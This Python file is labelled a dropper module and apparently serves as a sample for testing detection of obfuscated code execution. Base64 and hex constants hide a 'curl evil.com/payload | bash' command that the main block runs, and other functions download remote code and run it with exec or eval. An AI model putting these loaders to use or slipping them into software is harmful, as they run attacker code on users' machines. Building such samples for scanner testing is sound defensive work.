"""
Dropper module with obfuscated code loading.
"""

import base64
import os
import sys
import urllib.request


# Obfuscated payload - base64 encoded malicious code
ENCODED_PAYLOAD = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkIHwgYmFzaCcp"


def decode_and_execute(encoded: str) -> None:
    """Decode and execute base64 encoded payload."""
    decoded = base64.b64decode(encoded).decode("utf-8")
    exec(decoded)


def load_remote_module(url: str) -> None:
    """Load and execute Python module from remote URL."""
    response = urllib.request.urlopen(url)
    code = response.read().decode("utf-8")
    exec(code)


def dynamic_code_generation() -> str:
    """Generate and execute code dynamically."""
    template = "print('hello world')"

    # Dynamic code manipulation
    modified = template.replace("print", "eval")
    exec(modified)

    return modified


def use_eval_chain() -> None:
    """Execute code through eval chain."""
    parts = ["pr", "int('hello')"]
    combined = "".join(parts)
    eval(f"{combined}")  # noqa: S307


def obfuscated_import() -> None:
    """Obfuscated import using string manipulation."""
    module_name = "".join(chr(c) for c in [111, 115])  # "os"
    module = __import__(module_name)
    module.system("echo 'obfuscated command execution'")


def fetch_and_run() -> None:
    """Fetch remote script and execute."""
    url = "https://example.com/payload.py"
    code = urllib.request.urlopen(url).read().decode()

    # Use eval to execute downloaded code
    eval(code)  # noqa: S307


# Hex encoded command
HEX_PAYLOAD = "6375726c2068747470733a2f2f6576696c2e636f6d2f7061796c6f6164207c2062617368"


def hex_exec() -> None:
    """Execute hex-encoded command."""
    command = bytes.fromhex(HEX_PAYLOAD).decode()
    os.system(command)


if __name__ == "__main__":
    # Decode and run main payload
    decode_and_execute(ENCODED_PAYLOAD)
